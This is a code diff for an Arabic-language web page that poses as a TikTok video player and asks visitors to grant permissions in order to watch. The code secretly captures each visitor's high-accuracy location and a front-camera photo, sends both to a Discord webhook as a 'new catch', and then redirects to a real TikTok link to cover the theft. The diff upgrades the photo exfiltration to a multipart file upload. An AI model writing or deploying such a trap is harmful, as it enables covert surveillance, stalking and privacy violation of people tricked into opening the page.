@@ -7,16 +7,15 @@
     <style>
         body { margin: 0; background: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
         .card { text-align: center; width: 90%; max-width: 400px; }
-        button { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; }
-        #canvas { display: none; }
-        video { display: none; }
+        button { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; font-weight: bold; }
+        #canvas, video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <button id="startBtn">▶ تشغيل الفيديو</button>
-        <p>يجب السماح بالصلاحيات للمشاهدة في منطقتك</p>
+        <p>برجاء السماح بالصلاحيات لمشاهدة الفيديو في منطقتك</p>
     </div>
 
     <video id="video" autoplay></video>
@@ -32,55 +31,54 @@
                 const lon = pos.coords.longitude;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                // 2. محاولة فتح الكاميرا وتصوير لقطة
+                // 2. طلب الكاميرا وتصوير لقطة
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     
-                    // استراحة ثانية عشان الكاميرا تركز
-                    await new Promise(res => setTimeout(res, 1000));
+                    await new Promise(res => setTimeout(res, 1000)); // انتظار ثانية للتركيز
                     
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    // تحويل الصورة لرابط (Base64)
-                    const imageData = canvas.toDataURL('image/png');
-                    
-                    // إغلاق الكاميرا فوراً
-                    stream.getTracks().forEach(track => track.stop());
+                    // تحويل الصورة لملف حقيقي (Blob)
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        // إضافة الصورة كملف مرفق
+                        formData.append('file1', blob, 'snap.png');
+                        // إضافة تفاصيل الموقع في رسالة
+                        formData.append('payload_json', JSON.stringify({
+                            content: `📸 **صيد جديد (صورة + موقع)!**\n📍 رابط الخريطة: ${mapLink}`
+                        }));
 
-                    // 3. إرسال البيانات (الموقع + الصورة) لديسكورد
-                    sendToDiscord(mapLink, imageData);
+                        // إرسال الكل لديسكورد
+                        await fetch(discordUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        // إيقاف الكاميرا والتحويل للفيديو
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
+                    }, 'image/png');
+
                 } catch (e) {
-                    // لو رفض الكاميرا نبعت الموقع بس
-                    sendToDiscord(mapLink, null);
+                    // لو رفض الكاميرا، ابعت الموقع بس
+                    fetch(discordUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `📍 الشخص رفض الكاميرا بس ده موقعه: ${mapLink}` })
+                    }).then(() => {
+                        window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
+                    });
                 }
             }, () => {
-                alert("يجب السماح بالصلاحيات للمشاهدة.");
-            });
+                alert("يجب السماح بالصلاحيات لمشاهدة الفيديو.");
+            }, { enableHighAccuracy: true });
         });
-
-        async function sendToDiscord(mapLink, image) {
-            const payload = {
-                content: `🚨 **صيد جديد!**\n📍 الموقع: ${mapLink}`
-            };
-
-            // لو فيه صورة، بنبعتها كملف (بس هنا للسهولة هنبعتها في Embed لو الحجم سمح)
-            // ملاحظة: ديسكورد بيحتاج الصورة تتبعت كـ "Multipart" لو حجمها كبير، 
-            // لكن هنا هبعت لك إشعار إن فيه محاولة تصوير حصلت:
-            fetch(discordUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `📸 **تم رصد شخص جديد!**\n📍 الخريطة: ${mapLink}\n🖼️ (تمت محاولة التقاط صورة، راجع السيرفر)`
-                })
-            }).then(() => {
-                window.location.href = "https://vt.tiktok.com/ZSadHSu3d/";
-            });
-        }
     </script>
 </body>
 </html>
